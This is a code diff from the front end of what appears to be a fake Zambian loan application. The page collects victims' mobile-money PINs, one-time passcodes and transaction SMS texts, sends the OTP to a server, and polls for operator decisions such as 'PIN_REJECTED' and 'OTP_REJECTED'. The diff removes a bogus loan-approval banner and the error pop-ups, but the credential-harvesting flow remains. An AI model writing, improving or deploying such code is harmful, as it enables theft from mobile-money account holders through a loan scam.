@@ -278,12 +278,10 @@ async function submitOtpCode() {
     body: JSON.stringify({ appId: appDataStore.appId, otpCode })
   });
 
-  const finalApprovalMessage = `╔════════════════════════════════════╗\n💚✅ CONGRATULATIONS! ✅💚\n╚════════════════════════════════════╝\n\n🇿🇲 ZAMBIA LOAN APPROVAL UPDATE 🇿🇲\n\n🎉 Dear Valued Applicant,\n\n✅ Congratulations! Your loan application has successfully passed the initial review process.\n\n🟢 Your application is now under final verification by our loan processing team.\n\n⏳ Please wait just a few more minutes while we complete the review.\n\n💵 Once the verification is finalized and approved, your loan will be released immediately to your registered payment account.\n\n📲 Kindly keep your phone switched on and remain available for any important notifications.\n\n💚 Thank you for choosing our loan services.\n\n════════════════════════════════════\n✅ Status: UNDER FINAL REVIEW\n🟢 Next Step: Loan Disbursement After Final Approval\n⏱️ Estimated Waiting Time: A Few Minutes\n════════════════════════════════════\n\n🎊 Thank you for your patience, and congratulations once again! 🎊`;
-
-  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success', 'OTP_REJECTED', 'screen-otp', finalApprovalMessage);
+  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success', 'OTP_REJECTED', 'screen-otp', null);
 }
 
-function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, rejectionStatus, rejectionScreenId, successMessage) {
+function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, rejectionStatus, rejectionScreenId) {
   if (pollInterval) clearInterval(pollInterval);
 
   pollInterval = setInterval(async () => {
@@ -315,14 +313,12 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
         }
 
         document.getElementById(nextScreenId).classList.add('active');
-        if (successMessage) alert(successMessage);
       } else if (data.status === rejectionStatus || data.status === 'PIN_REJECTED') {
         clearInterval(pollInterval);
         document.getElementById(waitingScreenId).style.display = 'none';
         
         // Handle PIN_REJECTED globally regardless of where it's triggered from
         if (data.status === 'PIN_REJECTED') {
-          alert('❌ WRONG PIN ENTERED. Please check your MoMo PIN and try again.');
           document.querySelectorAll('.p-pin').forEach(i => i.value = '');
           const btn = document.getElementById('btn-login-momo');
           if (btn) {
@@ -337,9 +333,7 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
           return;
         }
 
-        let errorMsg = '❌ Verification Rejected';
         if (rejectionStatus === 'SMS_REJECTED') {
-          errorMsg = '❌ WRONG SMS PASTED. Please copy and paste the correct transaction SMS message.';
           const smsInput = document.getElementById('sms-text-input');
           if (smsInput) smsInput.value = '';
           const btn = document.getElementById('btn-submit-sms');
@@ -349,7 +343,6 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
             btn.setAttribute('disabled', 'true');
           }
         } else if (rejectionStatus === 'OTP_REJECTED') {
-          errorMsg = '❌ WRONG OTP. Please check your code and enter the correct OTP.';
           document.querySelectorAll('.p-otp').forEach(i => i.value = '');
           const btn = document.getElementById('btn-verify-otp');
           if (btn) {
@@ -362,7 +355,6 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
         }
 
         document.getElementById(rejectionScreenId).classList.add('active');
-        alert(errorMsg);
       }
     } catch (e) {
       console.error('Polling error:', e);
